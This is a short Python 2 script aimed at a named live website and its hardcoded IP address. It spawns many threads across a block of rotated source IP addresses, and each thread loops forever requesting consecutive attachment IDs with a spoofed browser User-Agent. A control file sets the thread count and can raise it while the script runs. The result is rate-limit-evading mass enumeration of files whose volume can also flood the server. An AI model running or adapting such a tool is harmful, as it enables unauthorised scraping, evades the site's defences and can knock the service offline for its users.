import sys
import threading
import time
import socket

try: from urllib import urlencode
except ImportError:
    from urllib.parse import urlencode

fo = open("thread.txt", "r+")
fo.write("100");

# Close opend file
fo.close()


glob=1
def task(page,srcip):
 global glob
 while True:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((srcip,0))
  s.connect(('104.20.78.179', 80))
  #s.settimeout(1)

  data = urlencode(dict(param='a')).encode('ascii')
  s.sendall(
                   'GET /index.php?app=core&module=attach&section=attach&attach_id='+str(glob)+' HTTP/1.1\r\n' +
                   'Host: tamilrockers.nu \r\n'+
                   'User-Agent: Mozilla/5.0 (X11; Ubuntu; linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0 \r\n'+
                   'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 \r\n'+
                   'Accept-Language: en-US,en;q=0.5 \r\n'+
                   'Connection: close \r\n'+

                   '\r\n'
        )


  chunk = s.recv(65536)
  print srcip,'\t','page=',glob,'\t',chunk[0:15]
  glob=glob+1

iplist=[]

try:
 ip_bits=sys.argv[1].split('.');
 host_bit=int(ip_bits[3]);
except:
 print "Invalid ip address"
 sys.exit(0)

try:
 no_of_ip=int(sys.argv[2])
except:
 print "Invalid 2nd Argv"
 sys.exit(0)

for i in range(0,no_of_ip):
 iplist.append(ip_bits[0]+'.'+ip_bits[1]+'.'+ip_bits[2]+'.'+str(host_bit+i))
 print i

g=0
while True:
 try:
  file=open("thread.txt","r+")
  strno=file.read(10)
  intno=int(strno)
  file.close()
  if intno!=g:
   print "mismatch";
   for ip in iplist:
    for i in range(0,intno):
     t2=threading.Thread(target=task,args=(i,ip))
     t2.start()
   g=intno
  else:
   print "match";
   time.sleep(10)
 except:
  print "I/O error";

                                                             


